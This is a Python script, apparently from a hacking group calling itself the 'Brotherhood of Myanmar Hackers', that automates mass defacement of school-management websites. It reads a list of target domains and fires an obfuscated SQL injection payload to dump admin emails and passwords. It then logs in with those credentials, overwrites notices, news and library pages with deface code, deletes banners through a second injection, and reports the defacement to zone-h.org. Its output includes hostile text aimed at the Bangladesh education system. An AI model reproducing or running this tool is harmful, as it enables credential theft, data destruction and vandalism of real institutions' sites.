import urllib2
import lxml.html
import socket
import os
import json
import requests
from lxml import html
class exp(object):
    s = requests.session()
    defacecode = ""
    query = "/about_us.php?menu=aboutus&id=-about-0000001%27%20/*!50000Union*/%20/*!50000Select*/%201,(/*!50000SELECT*/(@x)FROM(/*!50000SELECT*/(@x:=0x00)%20,(/*!50000SELECT*/(@x)FROM(user_info)WHERE(@x)IN(@x:=/*!50000CONCAT*/(0x20,@x,0x3c626d68776173686572653e,UserEmail,0x3a,Password,0x3c2f626d68776173686572653e3c62723e))))x)--%20-"
    finish_list = []
    def run(self):
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---  BROTHERHOOD OF MYANMAR HACKERS! --===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        f1 = open("defacecode.txt","r")
        codes = f1.readlines()
        for code in codes:
            self.defacecode = self.defacecode + code
        #print self.defacecode
        

        file = open("attacklist.txt", "r") 

        urls =file.readlines() 
        for url in urls:
            #print len(url[:-2])
            print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
            print "\n"
            tf = False
            site = url[:-1]
            try:
                print socket.gethostbyname(site)
                site = "http://"+site
                tf = True
            except:
                tf = False
            
            if tf == True:
                self.attack(site)
            else:
                print "use proxy to bypass for this domain => "+site

        for finish in self.finish_list:
            print finish        

    def attack(self,site):
        print site
        print "exploiting...."
        self.inject(site)
    
    def inject(self,site):
        print "Gathering data..."
        try:
            req = self.s.get(site+self.query) 
            page = html.fromstring(req.text)
            text = page.xpath("//bmhwashere/text()")
            if len(text) == 0:
                print "not vulnerability!"
            else:
                usr = None
                passwd = None
                for tt in text:
                    print tt
                    tt = tt.split(':')
                    if(len(tt)==2):
                        usr = tt[0]
                        passwd = tt[1]
                self.sitelogin(usr,passwd,site+'/')
        except:
            print "Failed....Please recheck again for this site."
        #text = page.xpath("//a/text()")
        #i  = raw_input()
        
    def sitelogin(self,user,password,site):
        s = requests.session()
        payload = {'login':'Sign me in','email': user, 'password': password}
        headers={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'}

        adminurl = site+"admin/index.php"
        r = s.post(adminurl, headers=headers,data=payload)
        
        #print r.text
        if r.status_code == 200:
            payload = {'login':'Sign me in','email': user, 'password': password}
            headers={
    'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'}

            defurl = site+"admin/add_notice.php?menu=notice"
            payloaddeface = {'add':'    s   ','id':'','title': self.defacecode, 'desc': self.defacecode}
            r = s.post(defurl, headers=headers,data=payloaddeface)
            #print r.text
            print "Finish Defacing! Fuck you bangladesh education system."
            print "Deleting Banner..."
            payloaddeface = {'id':"'%20/*!50000oR*/%20id=id%20/*!50000oR*/'a",'action':'delete'}
            r = s.post(defurl, headers=headers,data=payloaddeface)

            print "Updating Library info..."
            liburl = site+"admin/add_library_info.php?menu=library_info"
            payloaddeface = {'desc':self.defacecode,'edit':'','id':'LIB-00001','action':'delete'}
            r = s.post(liburl, headers=headers,data=payloaddeface)

            print "Updating news..."
            liburl = site+"admin/add_news.php?menu=news"
            payloaddeface = {'title':self.defacecode,'add':' '}
            r = s.post(liburl, headers=headers,data=payloaddeface)

            print "Finish Defacing"

            try:
                print "Posting Mirror to zone-h.org ..."
                mirrorurl = "http://www.zone-h.org/notify/single"
                payloaddeface = {'defacer':"brotherhood of myanmar hackers",'domain1':self.domain,'hackmode':'1','reason':'3'}
                r = s.post(mirrorurl, headers=headers,data=payloaddeface)
                root = html.fromstring(r.text)
                text = root.xpath("//font[@color='red']/text()")
                if len(text)>3:
                    print text[1]
            except:
                print "Failed to make a mirror"
            print "Finish Everything..."
            self.finish_list.append(site)
if __name__ == '__main__':
    exp().run()